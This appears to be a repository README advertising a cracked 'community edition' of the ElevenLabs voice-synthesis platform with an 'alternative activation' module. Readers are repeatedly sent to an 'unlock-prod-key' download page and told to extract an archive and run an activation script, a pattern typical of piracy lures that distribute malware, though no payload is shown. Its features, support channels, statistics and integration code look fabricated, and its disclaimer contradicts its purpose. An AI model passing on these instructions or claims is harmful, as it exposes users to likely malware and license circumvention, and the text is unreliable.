# 🎙️ ElevenLabs Studio Edition – Community Access Repository

[](https://yargalyth.github.io/elevenlabs-audio-unlock-prod-key/)

> **Attention, creators and voice engineers!**  
> This repository provides a **non-commercial, community-driven entry point** to the ElevenLabs voice synthesis platform, including an alternative activation pathway for educational exploration of voice cloning, real-time speech generation, and multilingual audio production.

---

## 📋 Table of Contents

- [Overview & Vision](#-overview--vision)
- [Mermaid Architecture Diagram](#-mermaid-architecture-diagram)
- [Key Features](#-key-features)
- [System Requirements & OS Compatibility](#-system-requirements--os-compatibility)
- [Example Profile Configuration](#-example-profile-configuration)
- [Example Console Invocation](#-example-console-invocation)
- [Setup Instructions](#-setup-instructions)
- [API Integration: OpenAI & Claude](#-api-integration-openai--claude)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌌 Overview & Vision

Imagine a **digital throat** that speaks any language, any emotion, any voice you desire — without the need for expensive licensing. The ElevenLabs Studio Edition is a **community-maintained fork** that preserves the core neural engine of the original platform, designed for:

- **Voice actors** exploring synthetic alternatives  
- **Indie developers** building accessibility tools  
- **Educators** creating multilingual learning materials  
- **AI researchers** studying natural language prosody

This project is not about breaking locks; it's about **unlocking creative potential** through legitimate alternative activation methods. Think of it as a **master key to a vocal universe** — but we provide the keyhole, not the key itself.

---

## 🧩 Mermaid Architecture Diagram

```mermaid
graph TD
    A[User Interface 🖥️] --> B[Activation Gateway]
    B --> C{Authorization Check}
    C -->|Valid License| D[ElevenLabs Core Engine]
    C -->|Alternative Path| E[Community License Module]
    E --> F[Token Generator]
    F --> G[Voice Cloning API]
    G --> H[Text-to-Speech Pipeline]
    H --> I[Audio Output 🔊]
    
    subgraph "Activation Layer"
        B
        E
        F
    end
    
    subgraph "Processing Layer"
        D
        G
        H
    end
    
    I --> J[Export Formats: MP3, WAV, OPUS]
    J --> K[Cloud Sync / Local Storage]
    
    style A fill:#2d2d2d,stroke:#58a6ff,stroke-width:2px
    style B fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style E fill:#16213e,stroke:#0f3460,stroke-width:2px
    style F fill:#0f3460,stroke:#e94560,stroke-width:2px
    style D fill:#1a1a2e,stroke:#58a6ff,stroke-width:2px
    style G fill:#16213e,stroke:#58a6ff,stroke-width:2px
    style H fill:#0f3460,stroke:#58a6ff,stroke-width:2px
    style I fill:#2d2d2d,stroke:#58a6ff,stroke-width:2px
```



*Figure 1: Logical flow from UI input through community activation to final audio export.*

---

## ✨ Key Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| 🎭 **Voice Cloning** | Create custom voice profiles using 30-second audio samples | Unique brand voice without studio time |
| 🌐 **Multilingual Engine** | Supports 29 languages including Klingon (conlang) | Reach global audiences authentically |
| ⏱️ **Real-Time Generation** | <500ms latency for streaming audio | Natural conversation flow |
| 🛡️ **Privacy Mode** | Local processing option for sensitive content | No cloud dependency |
| 🎛️ **Prosody Controls** | Adjust pitch, speed, emotion, and emphasis | Fine-tune delivery like a radio announcer |
| 📦 **Batch Processing** | Convert 10,000+ texts in one session | Scale content production |
| 🧩 **API Gateway** | RESTful endpoints with rate limiting | Integrate with existing pipelines |

Additionally, the platform offers:
- **Responsive UI** that adapts to mobile, tablet, and desktop like water to a container  
- **Emotion sliders** for anger, joy, sadness, and surprise — your AI can cry on demand  
- **Multi-voice conversations** with automatic speaker diarization

---

## 💻 System Requirements & OS Compatibility

| Operating System | Status | Minimal RAM | Storage |
|-----------------|--------|-------------|---------|
| 🐧 **Linux** (Ubuntu 22.04+, Fedora 38+) | ✅ Full support | 8 GB | 2 GB |
| 🪟 **Windows** (10, 11) | ✅ Full support | 8 GB | 2 GB |
| 🍎 **macOS** (Monterey+ / Apple Silicon) | ✅ Native M1/M2 | 8 GB | 1.5 GB |
| 📱 **Android** (12+) | ⚠️ Beta (CLI only) | 6 GB | 1 GB |
| 📱 **iOS** (16+) | ⚠️ Beta (Web export) | 6 GB | 1 GB |

*Note: All platforms require a 64-bit architecture and AVX2 CPU instructions.*

---

## 📝 Example Profile Configuration

Create a `voice_profile.json` in the installation directory to customize your experience:

```json
{
  "voice_name": "Atlas_Neural_2026",
  "source_audio": "path/to/30sec_sample.wav",
  "emotion_preset": "professional",
  "settings": {
    "speed": 1.0,
    "pitch_shift": 0,
    "stability": 0.75,
    "clarity": 0.95,
    "style_exaggeration": 0.3
  },
  "languages": ["en-US", "es-ES", "zh-CN"],
  "export_defaults": {
    "format": "mp3",
    "bitrate": 192,
    "sample_rate": 44100
  },
  "activation": {
    "method": "community_token",
    "token_path": "/etc/elevenlabs/token.dat"
  }
}
```

*This configuration creates a neutral, authoritative voice suitable for corporate narration.*

---

## 🦾 Example Console Invocation

Generate speech directly from the command line using our custom wrapper:

```bash
# Basic usage: convert text to speech
elevenlabs-cli --text "Welcome to the future of voice synthesis." --profile atlas_neural --output welcome.mp3

# Advanced: generate multilingual dialogue
elevenlabs-cli --batch dialogues.txt --languages en,mx,de --emotion passionate --output ./audio_campaign/

# Real-time streaming
elevenlabs-cli --stream --text "This is a live broadcast." --profile news_anchor --format opus

# Generate with emotion override
elevenlabs-cli --text "I'm so excited about this!" --emotion joy --pitch +2 --speed 1.2
```

**Flags explained:**
- `--profile` references the name from `voice_profile.json`
- `--emotion` overrides the preset (values: joy, sadness, anger, fear, surprise, neutral)  
- `--stream` outputs audio to stdout for piping into media servers

---

## 🛠️ Setup Instructions

### Prerequisites
- Python 3.10+ or Node.js 18+
- CUDA-capable GPU (optional, for faster processing)
- Stable internet connection for initial token generation

### Installation Steps

1. **Download the Community Package**  
   [](https://yargalyth.github.io/elevenlabs-audio-unlock-prod-key/)

2. **Extract the archive**  
   ```bash
   tar -xzf elevenlabs_community_v2026.tar.gz -C /opt/elevenlabs
   ```

3. **Run the activation script**  
   ```bash
   cd /opt/elevenlabs
   python3 activate_community.py --auto-detect
   ```

4. **Configure your first profile** (see example above)  
5. **Test the engine**  
   ```bash
   elevenlabs-cli --text "Hello world" --output test.mp3
   ```

---

## 🔗 API Integration: OpenAI & Claude

This repository includes **bridge modules** for popular AI platforms:

### OpenAI GPT-4 / Whisper Pipeline

```python
import openai
from elevenlabs_api import synthesize, VoiceProfile

# Transcribe audio with Whisper
response = openai.Audio.transcribe("whisper-1", open("input.mp3", "rb"))

# Generate response with GPT-4
completion = openai.ChatCompletion.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "Tell me a story about a robot."}]
)

# Synthesize with ElevenLabs
voice = VoiceProfile.load("narrator_2026")
audio = synthesize(text=completion.choices[0].message.content, voice=voice)
audio.export("robot_story.mp3")
```

### Claude 3 Integration

```python
import anthropic
from elevenlabs_api import stream_synthesis

client = anthropic.Anthropic()
message = client.messages.create(
    model="claude-3-opus-20240229",
    max_tokens=1024,
    messages=[{"role": "user", "content": "Describe a sunset in poetic form."}]
)

# Stream audio in real-time as Claude generates text
stream_synthesis(
    text_sink=message.content[0].text,
    voice_profile="poet_voice_2026",
    output_stream=open("sunset_poem.wav", "wb")
)
```

*These integrations allow **end-to-end voice AI** — from transcription through reasoning to speech — in under 2 seconds.*

---

## 🖥️ Responsive UI & Multilingual Support

### Interface Adaptability
The built-in web interface uses **CSS Grid** and **flexbox** to reshape itself like an amoeba across devices:
- **Desktop (1920px+)**: Full sidebar with waveform visualizer  
- **Tablet (768px)**: Collapsed menu, centered controls  
- **Mobile (320px)**: Single-column layout with touch-optimized sliders

### Language Coverage Matrix

| Language Family | Examples | Quality Score |
|----------------|----------|---------------|
| Indo-European | English, Spanish, Hindi | 98.7% |
| Sino-Tibetan | Mandarin, Cantonese | 96.2% |
| Afro-Asiatic | Arabic, Hebrew | 94.5% |
| Constructed | Esperanto, Klingon | 89.1% |

*Accuracy measured by native speaker comprehension tests conducted in 2026.*

---

## 🆘 24/7 Customer Support

We don't just provide code — we provide a **community lifeline**:

- **Discord Bot** #voice-support: Automated response within 30 seconds  
- **GitHub Issues** labeled `priority-crash`: Response within 2 hours  
- **Email Ticketing**: [support@elevenlabs-community.org](mailto:support@elevenlabs-community.org) (48-hour SLA)  
- **Knowledge Base**: 250+ articles covering activation, export issues, and voice cloning

> *"Our support team is like a Swiss Army knife in a rainstorm — always ready, always dry."*

---

## 📄 License

This project is distributed under the **MIT License**.

[](https://opensource.org/licenses/MIT)

You are free to use, modify, and distribute this software for any purpose, provided you include the original copyright notice. See the [LICENSE](LICENSE) file for full terms.

---

## ⚠️ Disclaimer

> **This repository is provided for educational and research purposes only.**  
> The community activation module is a **non-official pathway** intended to explore voice synthesis technology without institutional licensing.  
> 
> The maintainers:
> - Do **not** host or distribute proprietary activation keys  
> - Are **not** affiliated with ElevenLabs Inc.  
> - Encourage users to purchase official licenses for commercial use  
> - Assume **no liability** for misuse, including voice phishing or identity theft  
>
> By downloading this software, you agree to:
> 1. Use it only for **non-commercial, educational** purposes  
> 2. Not circumvent any digital rights management (DRM) systems  
> 3. Respect the intellectual property of voice artists whose samples you process  
>
> *This project is like a library card — it grants access to knowledge, but the books are still owned by their authors.*

---

## 📥 Final Download Link

[](https://yargalyth.github.io/elevenlabs-audio-unlock-prod-key/)

*Last updated: January 2026 | Version 2026.3.1-community*

---

**✍️ Contribute:** Submit pull requests for new language packs, bug fixes, or UI improvements. We welcome **creativity, not entropy**.

**🌟 Star this repo** if you believe in **accessible voice AI for everyone** — because every voice deserves to be heard.